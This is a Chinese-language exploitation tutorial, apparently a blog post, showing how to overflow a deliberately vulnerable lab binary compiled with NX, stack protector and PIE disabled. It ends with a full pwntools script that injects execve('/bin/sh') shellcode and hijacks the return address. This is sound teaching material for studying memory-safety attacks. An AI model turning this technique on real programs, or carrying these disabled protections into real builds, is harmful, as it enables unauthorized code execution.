## NX 基本介绍

即 `No-eXecute`，`NX`的基本原理是将数据所在内存页（用户栈中）标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令.

![微信截图_20221014115435.png](https://image.3001.net/images/20221014/1665723488_6348ec600cfa43b913a17.png!small)

如图所示，该程序的栈空间没有可执行`x`权限，所以无法执行任何代码。

道理我们都懂，那么如果我们 **关闭了`NX`到底可以干什么呢**，该如何利用呢？下面通过一个实验来说明。

## 实验基本信息

本次虽提供了源码，但在我们利用`NX`防护关闭这个漏洞时， **是在不知道源代码，编译时没有附带`-g`无法`gdb`直接进行调试的基础上进行的。**

### 源代码

    
    
    #include <stdio.h>
    #include <stdlib.h>
    #include <unistd.h>
    
    void init()
    {
        setvbuf(stdin,0,_IONBF,0);
        setvbuf(stdout,0,_IONBF,0);
    }
    
    int main()
    {
    
        char buf[100] = {0};
    
        init();
        printf("[DEBUGING] buf: %p\n",buf);
        printf("Hello,What's Your name?\n");
    
        read(0,buf,0x100);
        printf("I don't know you,so bye ;)\n");
    
        return 0;
    }
    

### `makefile`文件

> 提供`makefile`方便可以快速编译改代码
    
    
    OBJS=pwn_2.c
    CC=gcc
    CFLAGS+=-fno-stack-protector -no-pie -z execstack # 关闭NX
    
    pwn_2:$(OBJS)
            $(CC) $^ $(CFLAGS) -o $@
    
    clean:
            $(RM) *.o # 可省略
    

### checksec信息

![WeChat
Screenshot_20221011233837.png](https://image.3001.net/images/20221014/1665723509_6348ec75b64230866cd9f.png!small)

如图所示`NX disabled` **NX防护已关闭**

![WeChat
Screenshot_20221011233940.png](https://image.3001.net/images/20221014/1665723519_6348ec7f2ea79cb2ae2a7.png!small)

 **确定栈段具有可执行权限**

### 提示

 **进行编译的时候，gcc 会提示：**

`‘read’ writing 256 bytes into a region of size 100 overflows the destination
[-Wstringop-overflow=]`

不用理会， **因为本身我们验证的就是栈溢出，所以此处提示数据会溢出是正确的。**

## 启动！

本次我们不站在有源码的前提下，所以对程序的行为等进行一系列观察。

### 观察程序的行为

`./pwn_2`执行该程序

![微信截图_20221014114754.png](https://image.3001.net/images/20221014/1665723549_6348ec9dc38674db71795.png!small)

通过执行的结果我们发现该程序泄露了其中`buf`的地址，怀疑可能是 **保存读取信息的数组。**

我们再`strace`看看其系统调用。

![微信截图_20221014115615.png](https://image.3001.net/images/20221014/1665723565_6348ecad80d3503893df9.png!small)

初步确认通过`read`进行读取
读取的长度为`256字节（0x100），`由于read是底层的系统调用，所以此处不能武断的认为一定是调用了read，有可能是任何封装了read的函数（如
`fread` ），再通过`gdb`调试其程序`vmmap`查看虚拟内存空间。

![微信截图_20221014115435.png](https://image.3001.net/images/20221014/1665723591_6348ecc72ad67f58cf5ab.png!small)

 **确认`buf`处于栈段中，而且该栈段具有可执行权限**

### 确认栈溢出

进一步通过`objdump`看看程序的反汇编`objdump -D pwn_2 -M intel`。

![WeChat
Screenshot_20221012004353.png](https://image.3001.net/images/20221014/1665723601_6348ecd19ee1256cca661.png!small)

可以明显的看出，栈栈中开辟了`0x70`的空间，而且其中有 **0x64 字节的空间初始化为了 0 （8 * 12 + 4）**

确认这部分的空间就是为`buf`开辟的，所以`buf`为一个大小为 100 的数组，确认存在栈溢出，起始我们只需要确认栈的大小为 0x70
即可，接下来进行覆盖。

## 利用

### 思路

向栈中插入系统调用`execv`调用的代码，调用`/bin/bash`，从而执行一个`shell`，这只是一个最简单的利用方式，利用方式多种多样。

### 如何写入一段系统调用

[Linux System Call
Table](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md)

 **我们可以从该网站中查看相关的系统调用，与其需要的参数**

将对应的参数按照`rdi`、`rsi`、`rdx`、`rcx`、`r8`、`r9`的顺序传入相应的寄存器（网站中也会给出），并最后在`rax`加入其系统调用编号，再调用`syscall`即可。

如下为`execv`的

    
    
    xor rsi,rsi
    mov rdx,rsi
    mov rdi,address
    mov al.59
    syscall
    

其中`address`便是我们要传入的要调用执行`file`的名称的地址，也就是`/bin/bash`的地址。

NR| syscall name| rax| arg0 (rdi)| arg1 (rsi)| arg2 (rdx)  
---|---|---|---|---|---  
59| execve| 0x3b| const char *filename| const char *const *argv| const char
*const *envp  
  
其中 arg0 和 arg1 若不给值，寄存器赋 0 即可。

## 编写相关脚本

### 接收并保存`buf`的地址

首先我们现把`buf`的地址保存起来，为了后续向该地址中写入要执行的代码。

    
    
    from pwn import *
    
    p = process('./pwn_2')
    
    p.recvuntil(b'buf: ')
    
    buf = int(p.recvline()[:-1],16)
    
    log.info("buf address is :0x%x",buf)
    

测试成功，获得`buf`的地址。

![微信截图_20221014095644.png](https://image.3001.net/images/20221014/1665723626_6348ecea01f09d4ad96cc.png!small)

### 写入`/bin/bash`字符串

由于系统调用要调用`bash`弹出一个`shell`，所我们需要先将该字符写入到栈中，我们的思路是：

 **将该字符串写入到`buf`首地址的空间中，接下来系统调用传入地址时，只需要传入数组的首页地址即可。**

    
    
    payload = b'/bin/sh\0'
    p.sendafter(b'name?',payload)
    

先进行一下测试。

![微信截图_20221014100447.png](https://image.3001.net/images/20221014/1665723636_6348ecf41820ee0af044a.png!small)

成功写入到数组的开头处。

### 写入汇编代码

一些小细节，为了让我们写入的内容分行写入，我们使用 三引号 将内容包含起来。

    
    
    context.arch = 'amd64'    #指定架构类型 为amd64
    context.os = 'linux'      #系统为linux
    context.endian = 'little' #小端模式
    context.word_size = 64    # 64位系统
    
    sc = asm('''
        xor rsi,rsi
        mov rdx,rsi
        mov rdi, ''' + str(buf) + '''
        mov al,59
        syscall
    ''')
    

之前我们将`/bin/bash`字符串放到了数组的开头处，所以此时直接传`buf`的地址即可。  
![微信截图_20221014130309.png](https://image.3001.net/images/20221014/1665723817_6348eda9ae69e19a89f27.png!small)  
成功写入并返回到该系统调用处。

## 最终的脚本

接下来，写入以上内容后，我们只需要让接下来`0x70`大小的空间中剩下的空间全部填充，并溢出将返回的地址溢出位`buf`的地址即可。

    
    
    from pwn import *
    
    p = process('./pwn_2')
    
    p.recvuntil(b'buf: ')
    
    buf = int(p.recvline(),16)
    
    raw_input('>')
    
    log.info(hex(buf))
    
    payload = b'/bin/sh\0'
    
    context.arch = 'amd64'
    context.os = 'linux'
    context.endian = 'little'
    context.word_size = 64
    
    sc = asm('''
         xor rsi,rsi
         mov rdx,rsi
         mov rdi,''' + str(buf) + '''
         mov al,59
         syscall
    ''')
    
    payload += sc
    payload = payload.ljust(0x70,b'\x00') # 用 0 填充满0x70的空间
    payload += p64(0x0)
    payload += p64(buf + 8)
    raw_input('>')
    
    p.sendafter(b'name?',payload)
    
    raw_input('>')
    
    p.interactive()
    

![微信截图_20221014125519.png](https://image.3001.net/images/20221014/1665723652_6348ed04697118441fc85.png!small)

